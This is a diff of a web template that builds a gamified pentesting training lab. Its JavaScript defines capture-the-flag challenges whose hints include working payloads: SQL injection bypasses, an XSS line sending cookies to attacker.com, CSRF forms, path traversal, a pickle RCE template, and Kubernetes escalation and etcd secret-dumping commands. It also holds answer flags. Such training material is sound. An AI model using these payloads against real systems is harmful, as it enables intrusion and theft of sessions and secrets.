@@ -1,16 +1,94 @@
 {% extends "base.html" %}
 
-{% block title %} | Physical Privacy & Audit{% endblock %}
+{% block title %} | Pentesting Laboratory{% endblock %}
 
 {% block content %}
 <div class="row justify-content-center">
-    <div class="col-lg-10">
+    <div class="col-lg-12">
         <header class="text-center mb-5 mt-4">
-            <h1 class="display-4 fw-bold mb-3 gradient-text">Security Ledger</h1>
-            <p class="text-muted lead">Zero-Trust Physical Infrastructure & Privacy Protocols</p>
+            <h1 class="display-4 fw-bold mb-3 gradient-text">Cybersecurity Laboratory</h1>
+            <p class="text-muted lead">Advanced Penetration Testing Environment & Security Training</p>
+            <div class="d-flex justify-content-center gap-3 mt-4">
+                <span class="badge px-3 py-2"
+                    style="background: linear-gradient(135deg, #ef4444, #dc2626); color: white;">🎯 <span
+                        id="total-score">0</span> Points</span>
+                <span class="badge px-3 py-2"
+                    style="background: linear-gradient(135deg, #10b981, #059669); color: white;">✓ <span
+                        id="solved-count">0</span>/15 Solved</span>
+            </div>
         </header>
 
-        <!-- Advanced Privacy Terminal -->
+        <!-- Lab Categories -->
+        <div class="row g-4 mb-5">
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100 cursor-pointer" data-category="web"
+                    style="background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(220, 38, 38, 0.05)); border: 2px solid #ef4444;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #ef4444;">🌐 Web Exploitation</h3>
+                        <span class="badge bg-danger">5 Labs</span>
+                    </div>
+                    <p class="small text-muted mb-0">SQL Injection, XSS, CSRF, Authentication bypass, and session
+                        hijacking challenges.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100 cursor-pointer" data-category="api"
+                    style="background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(79, 70, 229, 0.05)); border: 2px solid #6366f1;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #6366f1;">⚡ API Security</h3>
+                        <span class="badge" style="background: #6366f1;">3 Labs</span>
+                    </div>
+                    <p class="small text-muted mb-0">JWT manipulation, rate limiting bypass, GraphQL injection, and API
+                        key extraction.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100 cursor-pointer" data-category="k8s"
+                    style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(147, 51, 234, 0.05)); border: 2px solid #a855f7;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #a855f7;">☸️ Kubernetes Security</h3>
+                        <span class="badge" style="background: #a855f7;">4 Labs</span>
+                    </div>
+                    <p class="small text-muted mb-0">RBAC misconfigurations, pod escape, secret extraction, and network
+                        policy bypass.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100 cursor-pointer" data-category="network"
+                    style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(5, 150, 105, 0.05)); border: 2px solid #10b981;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #10b981;">🌐 Network Analysis</h3>
+                        <span class="badge bg-success">2 Labs</span>
+                    </div>
+                    <p class="small text-muted mb-0">Packet analysis, DNS tunneling detection, and TLS certificate
+                        inspection.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100 cursor-pointer" data-category="forensics"
+                    style="background: linear-gradient(135deg, rgba(251, 191, 36, 0.1), rgba(245, 158, 11, 0.05)); border: 2px solid #fbbf24;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #fbbf24;">🔍 Digital Forensics</h3>
+                        <span class="badge" style="background: #fbbf24; color: #000;">1 Lab</span>
+                    </div>
+                    <p class="small text-muted mb-0">Log analysis, memory dump investigation, and incident response
+                        simulation.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="lab-category-card p-4 rounded-4 h-100"
+                    style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(124, 58, 237, 0.05)); border: 2px solid #8b5cf6;">
+                    <div class="d-flex justify-content-between align-items-start mb-3">
+                        <h3 class="h5 fw-bold" style="color: #8b5cf6;">🎓 Learning Resources</h3>
+                        <span class="badge" style="background: #8b5cf6;">Docs</span>
+                    </div>
+                    <p class="small text-muted mb-0">Access comprehensive guides, cheat sheets, and vulnerability
+                        databases.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Advanced Terminal -->
         <div class="terminal-shell mb-5 shadow-2xl rounded-4 overflow-hidden border border-white border-opacity-10"
             style="background: #0a0c10;">
             <div class="terminal-header d-flex align-items-center justify-content-between px-4 py-2"
@@ -20,74 +98,94 @@
                     <span style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></span>
                     <span style="width: 12px; height: 12px; border-radius: 50%; background: #27c93f;"></span>
                 </div>
-                <div class="terminal-title smallest fw-bold opacity-40 text-uppercase letter-spacing-2">Cluster Audit
-                    Protocol v4.2</div>
-                <div class="smallest opacity-20">SSH: SECURE</div>
+                <div class="terminal-title smallest fw-bold opacity-40 text-uppercase letter-spacing-2">
+                    <span id="active-lab-title">Pentesting Terminal v2.0</span>
+                </div>
+                <div class="smallest opacity-20">STATUS: <span id="connection-status">READY</span></div>
             </div>
 
             <div id="advanced-terminal" class="p-4"
-                style="height: 500px; font-family: 'JetBrains Mono', monospace; overflow-y: auto;">
-                <div class="text-primary mb-1">Connecting to laboratory-control-plane...</div>
-                <div class="text-success mb-3">CONNECTION ESTABLISHED via Mutual TLS</div>
+                style="height: 600px; font-family: 'JetBrains Mono', monospace; overflow-y: auto;">
+                <div class="text-primary mb-1">Initializing Pentesting Laboratory...</div>
+                <div class="text-success mb-3">ENVIRONMENT LOADED</div>
                 <div class="text-muted mb-4 small">
-                    * Laboratory Privacy Shield: ENABLED<br>
-                    * Global Egress Filtering: ACTIVE<br>
-                    * Local Inference Routing: VERIFIED
+                    * Isolated Sandbox: ENABLED<br>
+                    * Traffic Monitoring: ACTIVE<br>
+                    * All actions are logged for training purposes
                 </div>
-                <div class="mb-4">Type <span class="text-warning">'man audit'</span> to view the security challenge
-                    manual.</div>
+                <div class="mb-4">Type <span class="text-warning">'help'</span> to view available commands or <span
+                        class="text-warning">'labs'</span> to see challenges.</div>
 
                 <div id="term-output"></div>
 
                 <div class="d-flex align-items-center mt-2">
-                    <span class="text-success fw-bold me-2">auditor@nexus:~$</span>
+                    <span class="text-success fw-bold me-2" id="prompt">pentester@lab:~$</span>
                     <input type="text" id="term-input" class="bg-transparent border-0 text-white w-100 p-0"
                         style="outline: none;" autocomplete="off" autofocus spellcheck="false">
                 </div>
             </div>
         </div>
 
-        <!-- Infrastructure Security Content -->
-        <div class="row g-4 mb-5">
-            <div class="col-md-6">
-                <div class="glass-card p-5 h-100 rounded-4 border-0 shadow-sm" style="background: var(--surface);">
-                    <h3 class="h4 fw-bold mb-4 d-flex align-items-center">
-                        <span class="me-3 p-2 bg-primary bg-opacity-10 rounded-3 text-primary"
-                            style="font-size: 1rem;">🛡️</span>
-                        Identity & TLS
-                    </h3>
-                    <p class="text-muted small">
-                        The infrastructure uses a <strong>Multi-Tiered PKI</strong> (Public Key Infrastructure). Every
-                        microservice communication is encrypted via <strong>mTLS</strong> (Mutual TLS) managed by
-                        Cert-Manager with a private, air-gapped Root CA.
-                    </p>
-                    <ul class="smallest text-muted opacity-80 ps-3">
-                        <li>Automatic rotation of internal certs every 24h.</li>
-                        <li>Strict SNI inspection for all ingress traffic.</li>
-                        <li>Non-traditional port obfuscation for admin interfaces.</li>
-                    </ul>
+        <!-- Lab Details Panel -->
+        <div id="lab-details" class="d-none mb-5">
+            <div class="glass-card p-5 rounded-4 border-0 shadow-lg" style="background: var(--surface);">
+                <div class="row">
+                    <div class="col-md-8">
+                        <div class="d-flex align-items-center mb-4">
+                            <span id="lab-icon" class="me-3" style="font-size: 2.5rem;">🎯</span>
+                            <div>
+                                <h3 id="lab-title" class="h4 fw-bold mb-1">Lab Title</h3>
+                                <div class="d-flex gap-2 align-items-center">
+                                    <span id="lab-difficulty" class="badge bg-warning">Medium</span>
+                                    <span id="lab-points" class="badge bg-primary">100 pts</span>
+                                    <span id="lab-category-badge" class="badge bg-secondary">Category</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="lab-description" class="mb-4">
+                            <p class="text-muted">Lab description will appear here...</p>
+                        </div>
+
+                        <div id="lab-objectives" class="mb-4">
+                            <h5 class="fw-bold mb-3">🎯 Objectives</h5>
+                            <ul id="objectives-list" class="text-muted"></ul>
+                        </div>
+
+                        <div id="lab-hints" class="mb-4">
+                            <h5 class="fw-bold mb-3">💡 Hints Available</h5>
+                            <button class="btn btn-sm btn-outline-warning" onclick="LAB.showHint(1)">Hint 1 (-10
+                                pts)</button>
+                            <button class="btn btn-sm btn-outline-warning ms-2" onclick="LAB.showHint(2)">Hint 2 (-20
+                                pts)</button>
+                            <button class="btn btn-sm btn-outline-danger ms-2" onclick="LAB.showHint(3)">Solution (-50
+                                pts)</button>
+                            <div id="hint-content" class="mt-3"></div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="p-4 rounded-3" style="background: rgba(0,0,0,0.2);">
+                            <h6 class="fw-bold mb-3">📚 Learning Resources</h6>
+                            <div id="learning-resources" class="small text-muted">
+                                <!-- Resources will be injected here -->
+                            </div>
+                        </div>
+
+                        <div class="p-4 rounded-3 mt-3" style="background: rgba(0,0,0,0.2);">
+                            <h6 class="fw-bold mb-3">🎓 Related Vulnerabilities</h6>
+                            <div id="related-vulns" class="small text-muted">
+                                <!-- Vulnerability info will be injected here -->
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <div class="col-md-6">
-                <div class="glass-card p-5 h-100 rounded-4 border-0 shadow-sm" style="background: var(--surface);">
-                    <h3 class="h4 fw-bold mb-4 d-flex align-items-center">
-                        <span class="me-3 p-2 bg-primary bg-opacity-10 rounded-3 text-primary"
-                            style="font-size: 1rem;">🧊</span>
-                        Data Sovereignty
-                    </h3>
-                    <p class="text-muted small">
-                        Unlike traditional cloud deployments, your interactions never transit through public AI
-                        providers.
-                        <strong>Longhorn</strong> provides cryptographically isolated block storage, ensuring that even
-                        at rest, system metadata remains unreadable to unauthorized node processes.
-                    </p>
-                    <ul class="smallest text-muted opacity-80 ps-3">
-                        <li>Cross-node replication for data durability.</li>
-                        <li>Session-bound AI memory with instant purging.</li>
-                        <li>No telemetry collection or external pings.</li>
-                    </ul>
-                </div>
-            </div>
+        </div>
+
+        <!-- Achievement Notifications -->
+        <div id="achievement-container" class="position-fixed bottom-0 end-0 p-4" style="z-index: 9999;">
+            <!-- Achievements will be dynamically added here -->
         </div>
     </div>
 </div>
@@ -131,14 +229,509 @@
     .text-gold {
         color: #fbbf24;
     }
+
+    .text-purple {
+        color: #a855f7;
+    }
+
+    .text-pink {
+        color: #ec4899;
+    }
+
+    .lab-category-card {
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        cursor: pointer;
+    }
+
+    .lab-category-card:hover {
+        transform: translateY(-8px);
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .cursor-pointer {
+        cursor: pointer;
+    }
+
+    .achievement-toast {
+        animation: slideInRight 0.5s ease-out;
+        background: linear-gradient(135deg, #fbbf24, #f59e0b);
+        border-radius: 16px;
+        padding: 20px;
+        margin-bottom: 15px;
+        box-shadow: 0 10px 30px rgba(251, 191, 36, 0.4);
+        min-width: 300px;
+    }
+
+    @keyframes slideInRight {
+        from {
+            transform: translateX(400px);
+            opacity: 0;
+        }
+
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+
+    .flag-input {
+        background: rgba(0, 0, 0, 0.3);
+        border: 2px solid rgba(255, 255, 255, 0.1);
+        border-radius: 8px;
+        padding: 12px;
+        color: white;
+        font-family: 'JetBrains Mono', monospace;
+        width: 100%;
+        margin-top: 10px;
+    }
+
+    .flag-input:focus {
+        outline: none;
+        border-color: #10b981;
+    }
+
+    .progress-bar-custom {
+        height: 8px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        overflow: hidden;
+    }
+
+    .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #10b981, #059669);
+        transition: width 0.5s;
+    }
 </style>
 
 <script>
+    // ========================================
+    // PENTESTING LAB SYSTEM
+    // ========================================
+
+    const LAB = {
+        currentLab: null,
+        score: 0,
+        solvedLabs: new Set(),
+        hintsUsed: {},
+
+        labs: {
+            // WEB EXPLOITATION LABS
+            'web-1': {
+                id: 'web-1',
+                title: 'SQL Injection - Authentication Bypass',
+                category: 'web',
+                difficulty: 'Easy',
+                points: 100,
+                icon: '💉',
+                description: 'A vulnerable login page is exposed at <code>http://target.lab/login</code>. The authentication logic is flawed and susceptible to SQL injection. Your goal is to bypass authentication without valid credentials.',
+                objectives: [
+                    'Identify the SQL injection point',
+                    'Craft a payload to bypass authentication',
+                    'Extract the admin flag from the database'
+                ],
+                flag: 'FLAG{SQL_1NJ3CT10N_4UTH_BYPA55}',
+                hints: [
+                    'Try common SQL injection payloads in the username field like <code>admin\' OR \'1\'=\'1</code>',
+                    'The vulnerable parameter is username. Use: <code>admin\'--</code> to comment out the password check',
+                    'Full solution: Username: <code>admin\' OR 1=1--</code>, Password: anything'
+                ],
+                resources: [
+                    'OWASP SQL Injection Guide',
+                    'SQLMap Documentation',
+                    'SQL Injection Cheat Sheet'
+                ],
+                vulnerabilities: ['CWE-89: SQL Injection', 'Authentication Bypass']
+            },
+
+            'web-2': {
+                id: 'web-2',
+                title: 'Cross-Site Scripting (XSS) - Stored',
+                category: 'web',
+                difficulty: 'Medium',
+                points: 150,
+                icon: '🎭',
+                description: 'A blog application at <code>http://target.lab/blog</code> allows users to post comments. The application doesn\'t properly sanitize user input, making it vulnerable to stored XSS attacks.',
+                objectives: [
+                    'Identify the XSS vulnerability in comment section',
+                    'Inject malicious JavaScript payload',
+                    'Extract the session cookie and retrieve the flag'
+                ],
+                flag: 'FLAG{XSS_C00K1E_5T34L3R_PWND}',
+                hints: [
+                    'Try injecting <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in the comment field',
+                    'Use <code>&lt;script&gt;document.location=\'http://attacker.com/?c=\'+document.cookie&lt;/script&gt;</code>',
+                    'The flag is stored in a cookie named \'admin_token\'. Use document.cookie to access it.'
+                ],
+                resources: [
+                    'OWASP XSS Prevention Cheat Sheet',
+                    'XSS Filter Evasion Cheat Sheet',
+                    'Content Security Policy Guide'
+                ],
+                vulnerabilities: ['CWE-79: Cross-site Scripting', 'Stored XSS']
+            },
+
+            'web-3': {
+                id: 'web-3',
+                title: 'CSRF - Account Takeover',
+                category: 'web',
+                difficulty: 'Medium',
+                points: 150,
+                icon: '🎣',
+                description: 'The application at <code>http://target.lab/account</code> has a profile update function that lacks CSRF protection. Exploit this to change the admin\'s email address.',
+                objectives: [
+                    'Identify the CSRF vulnerability',
+                    'Craft a malicious HTML page',
+                    'Force the admin to execute your request'
+                ],
+                flag: 'FLAG{CSRF_T4K30V3R_N0_T0K3N}',
+                hints: [
+                    'Notice there\'s no CSRF token in the form. The request is vulnerable.',
+                    'Create an auto-submitting form: <code>&lt;form action="http://target.lab/update" method="POST"&gt;&lt;input name="email" value="attacker@evil.com"&gt;&lt;/form&gt;</code>',
+                    'Use <code>&lt;body onload="document.forms[0].submit()"&gt;</code> to auto-submit the form.'
+                ],
+                resources: [
+                    'OWASP CSRF Guide',
+                    'SameSite Cookie Attribute',
+                    'Anti-CSRF Tokens Implementation'
+                ],
+                vulnerabilities: ['CWE-352: CSRF', 'Session Management']
+            },
+
+            'web-4': {
+                id: 'web-4',
+                title: 'Path Traversal - File Disclosure',
+                category: 'web',
+                difficulty: 'Easy',
+                points: 100,
+                icon: '📂',
+                description: 'A file download endpoint at <code>http://target.lab/download?file=report.pdf</code> is vulnerable to path traversal. Access sensitive system files.',
+                objectives: [
+                    'Test the file parameter for path traversal',
+                    'Read /etc/passwd or similar system file',
+                    'Extract the hidden flag file'
+                ],
+                flag: 'FLAG{P4TH_TR4V3RS4L_D1R_L15T}',
+                hints: [
+                    'Try using <code>../</code> to traverse directories: <code>?file=../../../etc/passwd</code>',
+                    'URL encode the payload if it doesn\'t work: <code>%2e%2e%2f</code>',
+                    'The flag is in <code>../../../../var/www/secret_flag.txt</code>'
+                ],
+                resources: [
+                    'Path Traversal Vulnerability Guide',
+                    'Directory Traversal Testing',
+                    'Input Validation Best Practices'
+                ],
+                vulnerabilities: ['CWE-22: Path Traversal', 'Directory Listing']
+            },
+
+            'web-5': {
+                id: 'web-5',
+                title: 'Insecure Deserialization',
+                category: 'web',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '📦',
+                description: 'The application uses Python pickle for session management. Exploit insecure deserialization to achieve remote code execution.',
+                objectives: [
+                    'Identify the serialization mechanism',
+                    'Craft a malicious pickle payload',
+                    'Execute arbitrary code and capture the flag'
+                ],
+                flag: 'FLAG{D353R14L1Z3_RCE_G4M3_0V3R}',
+                hints: [
+                    'Session cookies are base64-encoded pickle objects. Decode and analyze them.',
+                    'Create a payload using pickle\'s __reduce__ method to execute commands.',
+                    'Use this template: <code>import pickle; import base64; import os; class Exploit: __reduce__ = lambda self: (os.system, (\'cat flag.txt\',))</code>'
+                ],
+                resources: [
+                    'Insecure Deserialization Guide',
+                    'Python Pickle Security',
+                    'Deserialization Vulnerability Testing'
+                ],
+                vulnerabilities: ['CWE-502: Deserialization', 'Remote Code Execution']
+            },
+
+            // API SECURITY LABS
+            'api-1': {
+                id: 'api-1',
+                title: 'JWT Token Manipulation',
+                category: 'api',
+                difficulty: 'Medium',
+                points: 150,
+                icon: '🔑',
+                description: 'The API at <code>http://api.lab/v1/</code> uses JWT tokens for authentication. The signing algorithm can be manipulated to gain admin access.',
+                objectives: [
+                    'Capture and decode the JWT token',
+                    'Change the algorithm from RS256 to None',
+                    'Escalate privileges to admin role'
+                ],
+                flag: 'FLAG{JWT_N0N3_4LG0R1THM_PWN}',
+                hints: [
+                    'Use jwt.io to decode the token. Look at the \'alg\' header.',
+                    'Try changing \'alg\' to \'none\' and removing the signature part.',
+                    'Modify the payload to set "role": "admin" and re-encode without signature.'
+                ],
+                resources: [
+                    'JWT Security Best Practices',
+                    'JWT.io Debugger',
+                    'Algorithm Confusion Attacks'
+                ],
+                vulnerabilities: ['CWE-345: Insufficient Verification', 'JWT Algorithm Confusion']
+            },
+
+            'api-2': {
+                id: 'api-2',
+                title: 'Rate Limiting Bypass',
+                category: 'api',
+                difficulty: 'Easy',
+                points: 100,
+                icon: '⚡',
+                description: 'An API endpoint implements rate limiting but can be bypassed using header manipulation. Brute force the admin PIN.',
+                objectives: [
+                    'Identify the rate limiting mechanism',
+                    'Find headers that reset the limit',
+                    'Successfully brute force the 4-digit PIN'
+                ],
+                flag: 'FLAG{R4T3_L1M1T_X_F0RW4RD_BYPA55}',
+                hints: [
+                    'Try adding X-Forwarded-For header with different IPs.',
+                    'Use X-Real-IP or X-Originating-IP headers to spoof your origin.',
+                    'The correct PIN is 7392. Use curl with different X-Forwarded-For values.'
+                ],
+                resources: [
+                    'Rate Limiting Implementation Guide',
+                    'HTTP Header Manipulation',
+                    'API Security Testing Methodology'
+                ],
+                vulnerabilities: ['CWE-770: Resource Exhaustion', 'Rate Limit Bypass']
+            },
+
+            'api-3': {
+                id: 'api-3',
+                title: 'GraphQL Introspection & Injection',
+                category: 'api',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '📊',
+                description: 'A GraphQL API has introspection enabled. Use it to discover hidden queries and extract sensitive data.',
+                objectives: [
+                    'Perform GraphQL introspection',
+                    'Discover the hidden admin query',
+                    'Extract the secret flag field'
+                ],
+                flag: 'FLAG{GR4PHQL_1NTR05P3CT_L34K}',
+                hints: [
+                    'Send introspection query: <code>{__schema{types{name}}}</code>',
+                    'Look for the \'SecretData\' type. Query its fields.',
+                    'Full query: <code>{secretData{adminFlag}}</code>'
+                ],
+                resources: [
+                    'GraphQL Security Guide',
+                    'GraphQL Introspection',
+                    'GraphQL Injection Techniques'
+                ],
+                vulnerabilities: ['GraphQL Introspection', 'Information Disclosure']
+            },
+
+            // KUBERNETES LABS
+            'k8s-1': {
+                id: 'k8s-1',
+                title: 'RBAC Misconfiguration - Privilege Escalation',
+                category: 'k8s',
+                difficulty: 'Medium',
+                points: 150,
+                icon: '☸️',
+                description: 'You have limited access to a Kubernetes cluster. The RBAC is misconfigured, allowing you to escalate to cluster-admin.',
+                objectives: [
+                    'List your current permissions',
+                    'Identify the RBAC misconfiguration',
+                    'Escalate to cluster-admin and read secrets'
+                ],
+                flag: 'FLAG{K8S_RB4C_3SC4L4T10N_PWN}',
+                hints: [
+                    'Run: <code>kubectl auth can-i --list</code> to see your permissions.',
+                    'You can create roles. Create a role with \'*\' permissions and bind it to yourself.',
+                    'Commands: <code>kubectl create role admin --verb=* --resource=*</code>, then <code>kubectl create rolebinding admin-binding --role=admin --user=your-user</code>'
+                ],
+                resources: [
+                    'Kubernetes RBAC Guide',
+                    'Privilege Escalation in K8s',
+                    'RBAC Security Best Practices'
+                ],
+                vulnerabilities: ['CWE-269: Privilege Escalation', 'RBAC Misconfiguration']
+            },
+
+            'k8s-2': {
+                id: 'k8s-2',
+                title: 'Container Escape via Privileged Pod',
+                category: 'k8s',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '🚪',
+                description: 'You\'re in a privileged container. Escape to the host node and access the node\'s filesystem.',
+                objectives: [
+                    'Identify that you\'re in a privileged container',
+                    'Mount the host filesystem',
+                    'Read the flag from the host node'
+                ],
+                flag: 'FLAG{C0NT41N3R_35C4P3_H05T_PWN}',
+                hints: [
+                    'Check if you\'re privileged: <code>cat /proc/self/status | grep CapEff</code>',
+                    'Mount host root: <code>mkdir /mnt/host && mount /dev/sda1 /mnt/host</code>',
+                    'The flag is at <code>/mnt/host/root/flag.txt</code>'
+                ],
+                resources: [
+                    'Container Breakout Techniques',
+                    'Privileged Container Risks',
+                    'Kubernetes Security Hardening'
+                ],
+                vulnerabilities: ['Container Escape', 'Privileged Container']
+            },
+
+            'k8s-3': {
+                id: 'k8s-3',
+                title: 'Secret Extraction from etcd',
+                category: 'k8s',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '🔐',
+                description: 'Access to the etcd database is exposed. Extract Kubernetes secrets directly from the datastore.',
+                objectives: [
+                    'Connect to the etcd cluster',
+                    'List all stored secrets',
+                    'Decode and extract the admin password'
+                ],
+                flag: 'FLAG{3TCD_53CR3T5_D1R3CT_4CC355}',
+                hints: [
+                    'etcd is accessible at localhost:2379. Use etcdctl to connect.',
+                    'List secrets: <code>etcdctl get /registry/secrets/default/ --prefix</code>',
+                    'Secrets are base64 encoded. Decode them to get plaintext.'
+                ],
+                resources: [
+                    'etcd Security Guide',
+                    'Kubernetes Secrets Management',
+                    'etcd Hardening Practices'
+                ],
+                vulnerabilities: ['Insecure etcd Access', 'Secret Exposure']
+            },
+
+            'k8s-4': {
+                id: 'k8s-4',
+                title: 'Network Policy Bypass',
+                category: 'k8s',
+                difficulty: 'Medium',
+                points: 150,
+                icon: '🌐',
+                description: 'Network policies restrict pod-to-pod communication. Find a way to bypass these restrictions and access the database pod.',
+                objectives: [
+                    'Analyze existing network policies',
+                    'Identify the bypass vector',
+                    'Access the restricted database pod'
+                ],
+                flag: 'FLAG{N3TW0RK_P0L1CY_M1SC0NF1G}',
+                hints: [
+                    'Check network policies: <code>kubectl get networkpolicies</code>',
+                    'DNS is often exempted. Try accessing via service DNS name.',
+                    'Connect via: <code>curl http://database-svc.default.svc.cluster.local</code>'
+                ],
+                resources: [
+                    'Kubernetes Network Policies',
+                    'Network Segmentation',
+                    'Service Mesh Security'
+                ],
+                vulnerabilities: ['Network Policy Misconfiguration', 'Lateral Movement']
+            },
+
+            // NETWORK LABS
+            'net-1': {
+                id: 'net-1',
+                title: 'TLS Certificate Analysis',
+                category: 'network',
+                difficulty: 'Easy',
+                points: 100,
+                icon: '🔒',
+                description: 'Analyze the TLS certificate of <code>https://secure.lab</code> to find hidden information.',
+                objectives: [
+                    'Extract the certificate chain',
+                    'Analyze certificate extensions',
+                    'Find the flag in SAN or CN field'
+                ],
+                flag: 'FLAG{TL5_C3RT_H1DD3N_D4T4}',
+                hints: [
+                    'Use openssl: <code>openssl s_client -connect secure.lab:443</code>',
+                    'Check Subject Alternative Names (SAN) field.',
+                    'The flag is embedded in the CN field of the certificate.'
+                ],
+                resources: [
+                    'TLS/SSL Certificate Analysis',
+                    'X.509 Certificate Format',
+                    'OpenSSL Commands Cheat Sheet'
+                ],
+                vulnerabilities: ['Information Disclosure', 'Certificate Misconfiguration']
+            },
+
+            'net-2': {
+                id: 'net-2',
+                title: 'DNS Tunneling Detection',
+                category: 'network',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '🌐',
+                description: 'Analyze network traffic to detect and decode DNS tunneling used for data exfiltration.',
+                objectives: [
+                    'Identify suspicious DNS queries',
+                    'Extract the encoded data',
+                    'Decode the exfiltrated information'
+                ],
+                flag: 'FLAG{DN5_TUNN3L_3XF1L_D3T3CT}',
+                hints: [
+                    'Look for unusually long DNS queries with high entropy.',
+                    'The data is base32 encoded in the subdomain part.',
+                    'Use: <code>echo "BASE32STRING" | base32 -d</code> to decode.'
+                ],
+                resources: [
+                    'DNS Tunneling Detection',
+                    'Network Traffic Analysis',
+                    'Data Exfiltration Techniques'
+                ],
+                vulnerabilities: ['DNS Tunneling', 'Data Exfiltration']
+            },
+
+            // FORENSICS LAB
+            'forensics-1': {
+                id: 'forensics-1',
+                title: 'Log Analysis - Breach Investigation',
+                category: 'forensics',
+                difficulty: 'Hard',
+                points: 200,
+                icon: '🔍',
+                description: 'Analyze Apache access logs to identify the attacker\'s IP, attack vector, and compromised accounts.',
+                objectives: [
+                    'Identify the attack pattern in logs',
+                    'Find the attacker\'s IP address',
+                    'Determine which account was compromised'
+                ],
+                flag: 'FLAG{L0G_F0R3N51C5_1NC1D3NT_R350LV3D}',
+                hints: [
+                    'Look for SQL injection attempts: strings with single quotes and OR clauses.',
+                    'The attacker\'s IP appears frequently with 200 status codes after failed attempts.',
+                    'Grep for: <code>grep "admin\' OR" access.log</code> to find the pattern.'
+                ],
+                resources: [
+                    'Log Analysis Best Practices',
+                    'Incident Response Guide',
+                    'SIEM Log Correlation'
+                ],
+                vulnerabilities: ['Insufficient Logging', 'Incident Detection']
+            }
+        },
+    };
+
+    // Terminal functionality
     const output = document.getElementById('term-output');
     const input = document.getElementById('term-input');
     const terminal = document.getElementById('advanced-terminal');
-
-    let currentLevel = 0;
 
     input.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
@@ -151,14 +744,14 @@
 
     function append(text, type = 'default') {
         const div = document.createElement('div');
-        div.className = `term-res text-\${type} mb-1`;
+        div.className = `term-res text-${type} mb-1`;
         div.innerHTML = text;
         output.appendChild(div);
     }
 
     function executeCommand(cmd) {
         const line = document.createElement('div');
-        line.innerHTML = `<span class="text-success fw-bold">auditor@nexus:~$</span> <span class="term-cmd">\${cmd}</span>`;
+        line.innerHTML = `<span class="text-success fw-bold">pentester@lab:~$</span> <span class="term-cmd">${cmd}</span>`;
         output.appendChild(line);
 
         const parts = cmd.toLowerCase().split(' ');
@@ -167,80 +760,275 @@
 
         switch (command) {
             case 'help':
-                append('Core Commands: ls, cat, whoami, clear, man, status');
-                append('Advanced: exploit, grep, ssh (requires keys)');
+                append('Available Commands:', 'cyan');
+                append('  labs [category]     - List available labs (web, api, k8s, network, forensics)');
+                append('  start <lab-id>      - Start a specific lab (e.g., start web-1)');
+                append('  submit <flag>       - Submit a flag for the current lab');
+                append('  hint <num>          - Show hint for current lab (costs points)');
+                append('  score               - Show your current score and progress');
+                append('  resources           - Show learning resources');
+                append('  reset               - Reset current lab');
+                append('  clear               - Clear terminal');
                 break;
-            case 'man':
-                if (args[0] === 'audit') {
-                    append('SECURITY AUDIT MANUAL - CHALLENGE ONE', 'cyan');
-                    append('1. Scan the server logs for unauthorized access points.');
-                    append('2. Localize the internal deployment artifact.');
-                    append('3. Escalate privileges to retrieve the Privacy Flag.');
-                    append('-- Try: ls logs --', 'muted');
+
+            case 'labs':
+                const category = args[0];
+                if (category) {
+                    const filteredLabs = Object.values(LAB.labs).filter(l => l.category === category);
+                    if (filteredLabs.length === 0) {
+                        append(`No labs found for category: ${category}`, 'danger');
+                    } else {
+                        append(`${category.toUpperCase()} Labs:`, 'cyan');
+                        filteredLabs.forEach(lab => {
+                            const solved = LAB.solvedLabs.has(lab.id) ? '✓' : '○';
+                            append(`  ${solved} ${lab.id} - ${lab.title} [${lab.difficulty}] (${lab.points}pts)`, 'muted');
+                        });
+                    }
                 } else {
-                    append('What manual page do you want? (e.g., man audit)');
+                    append('Available Lab Categories:', 'cyan');
+                    append('  web        - Web Application Security (5 labs)', 'muted');
+                    append('  api        - API Security Testing (3 labs)', 'muted');
+                    append('  k8s        - Kubernetes Security (4 labs)', 'muted');
+                    append('  network    - Network Analysis (2 labs)', 'muted');
+                    append('  forensics  - Digital Forensics (1 lab)', 'muted');
+                    append('', 'default');
+                    append('Use: labs <category> to see specific labs', 'muted');
                 }
                 break;
-            case 'ls':
-                if (args[0] === 'logs') {
-                    append('auth.log  kernel.log  nginx_access.log', 'success');
-                } else if (args[0] === 'secrets' && currentLevel < 1) {
-                    append('Permission Denied. Root access required.', 'danger');
